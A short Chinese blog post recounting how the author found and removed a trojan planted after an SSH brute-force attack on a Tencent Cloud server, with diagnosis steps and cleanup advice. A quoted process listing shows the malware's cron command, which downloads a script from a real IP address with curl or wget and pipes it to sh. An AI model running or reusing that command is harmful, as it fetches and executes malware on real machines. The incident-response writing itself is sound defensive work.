---
title: ECS遭遇安全攻击的一次经历
date: 2019-05-04 20:11:03
tags:
---

突然，腾讯云发出安全提示信息，先是SSH暴力破解的警告，过了几天又是ECS被植入木马的警告，Linux的安全防护被提上日程了！

# 服务器的问题表现

{% asset_img alert-0.png 腾讯云的警告信息汇总%}

- 登录ECS服务器，用`top`命令检查系统状态，发现CPU负荷长期维持100%，系统响应缓慢，其中`/tmp/vThHH`严重消耗资源，确认中招了！

{% asset_img alert-1.png SSH暴力破解的警告信息%}

- 服务器的root口令没有变化，但登录成功时提示有几百个`failed login attempts`，说明SSH口令已经被暴力破解

# 系统检查的主要工作

主要从以下几个方面入手：

1. 检查可疑的网络服务

使用`netstat -nlp`，发现除了22，80，443端口，还对外暴露了可疑的7946端口，调用者是`/tmp/vThHH`。

2. 检查可疑的系统进程

通过`ps -ef`命令，跟踪可疑进程`/tmp/vThHH`，发现父进程就是木马程序`/usr/bin/ybznfa2`。
进一步检查，发现了木马的加载进程。

```
root      4365   736  0 18:30 ?        00:00:00 /usr/sbin/CROND -n
root      4366  4365  0 18:30 ?        00:00:00 /bin/sh -c (/usr/bin/ybznfa2||/usr/libexec/ybznfa2||/usr/local/bin/ybznfa2||/tmp/ybznfa2||curl -m180 -fsSL http://109.237.25.145:8000/i.sh||wget -q -T180 -O- http://109.237.25.145:8000/i.sh) | sh
root      4367  4366  0 18:30 ?        00:00:00 /bin/sh -c (/usr/bin/ybznfa2||/usr/libexec/ybznfa2||/usr/local/bin/ybznfa2||/tmp/ybznfa2||curl -m180 -fsSL http://109.237.25.145:8000/i.sh||wget -q -T180 -O- http://109.237.25.145:8000/i.sh) |sh
```

3. 检查cron定时任务

该木马由crond启动，通过`crontab -u root -l`检查定时任务，发现每15分钟就执行一次上述bash脚本，这就是木马的埋点！

# 该木马的工作原理

- 通过网络爬虫等手段收集服务器域名信息
- 以服务器默认的root用户，通过ssh暴力破解获得口令
- 通过ssh登录，添加cron定时任务，从远端服务器下载木马程序，并存放在多个目录下
- 后台启动木马，打开自定义端口进行远程控制

# 处理措施

- 手工清理cron的任务清单
- 手工杀死`/tmp/vThHH`，`/usr/bin/ybznfa2`等可疑进程
- 手工删除上述木马程序
- 检查系统进程、网络服务、定时任务等状态，确认问题解决

# 几点体会

- 为彻底消除SSH暴力破解的威胁，关闭口令登录方式，改为密钥登录

---

# 参考文档